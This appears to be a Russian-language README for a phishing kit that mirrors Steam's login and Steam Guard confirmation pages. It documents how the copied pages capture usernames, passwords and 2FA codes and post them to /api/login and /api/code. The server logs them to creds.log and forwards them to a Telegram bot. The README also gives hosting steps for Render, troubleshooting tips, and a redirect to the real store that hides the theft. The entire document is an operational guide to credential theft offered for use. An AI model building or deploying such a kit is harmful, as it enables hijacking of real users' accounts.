# Steam Login Mirror — один index.html + server.py

Вся вёрстка в одном файле: **две оригинальные страницы Steam** (логин и
подтверждение входа через мобильное приложение), переключение между ними и
диалог ввода кода Steam Guard. Дизайн страниц не переписан — они упакованы
в файл как есть, из сохранённых копий.

## Файлы

| файл | зачем |
|------|--------|
| `index.html` | **готовый единый файл** (2.6 МБ): обе страницы, код, вся логика. Работает и просто открытый с диска |
| `server.py` | отдаёт `index.html` на любой маршрут, ловит `/api/login` и `/api/code`, пишет `creds.log` + Telegram |
| `build_single.py` | пересборка `index.html` из `index.singlefile.bak.html` + `next.html` |
| `index.singlefile.bak.html`, `next.html` | исходники страниц (в рантайме сервер их не использует) |
| `Procfile`, `requirements.txt` | Render: `python server.py`, зависимостей нет |

## Как устроен один файл

```
index.html
├── shell (html + <script type="text/plain" id="doc-login">base64</script> ...)
├── doc-login  = index.singlefile.bak.html + наш submit-хук
└── doc-guard  = next.html + кнопка "Войти с помощью кода" + диалог кода
```

Shell смотрит `?p=1|2`, декодирует нужную страницу и делает
`document.open/write/close` — в документе всегда ровно одна страница, поэтому
их CSS/JS не конфликтуют. `?p` не указан → логин.

## Поток

1. `GET /` → страница логина (та же вёрстка Steam).
2. Submit → JS ловит форму, читает `input[type=text]` / `input[type=password]`,
   шлёт `POST /api/login` (beacon + fetch), кладёт логин в `sessionStorage`,
   переходит на `?p=2`.
3. `?p=2` → страница «подтвердите вход в приложении», в тексте подставляется
   введённый логин (вместо `egorik_big_balls`).
4. Клик «Войти с помощью кода» → всплывает диалог Steam Guard (5 символов),
   submit → `POST /api/code` → редирект на `store.steampowered.com`.
5. Отмена/клик по фону/Esc закрывают диалог.

Браузер шлёт по две копии каждого сабмита (beacon + fetch), сервер склеивает их
4-секундным окном дедупа — в лог и Telegram попадает одна запись.

## Запуск

```bash
python server.py          # http://localhost:8000
PORT=9000 python server.py
```

Просто открыть `index.html` двойным щелчком тоже работает — просто без Telegram
и логов.

## Render

1. New → **Web Service**, подключить репозиторий.
2. **Runtime**: Python 3, **Build Command**: пусто, **Start Command**: `python server.py`.
3. Env (опционально, иначе значения из кода):

```
TELEGRAM_BOT_TOKEN = 123456:ABC...
TELEGRAM_CHAT_ID   = 123456789
PORT               = 10000   # Render ставит сам
```

## Логи

- stdout: `[CREDS] {"t":"...","kind":"login","username":"...","password":"...","ip":"..."}`
- `creds.log` рядом с `server.py` (на Render эфемерный), путь — `CREDS_LOG`.

Статика отдаётся только для css/js/svg/gif/png/jpg/webp/ico/woff/ttf; `creds.log`,
`server.py` и бэкапы по HTTP не достать — на всё остальное уходит `index.html`.

## Пересборка

```bash
python build_single.py
# [+] index.html: 2,631,750 bytes
```

## Частые ошибки

| симптом | причина | фикс |
|---------|---------|------|
| 500 на всех страницах | `index.html` не рядом с `server.py` | положить файл в корень |
| Telegram молчит | неверный token/chat | env, смотри `[-] Telegram error` в логах |
| порт занят | локально | `PORT=8080 python server.py` |
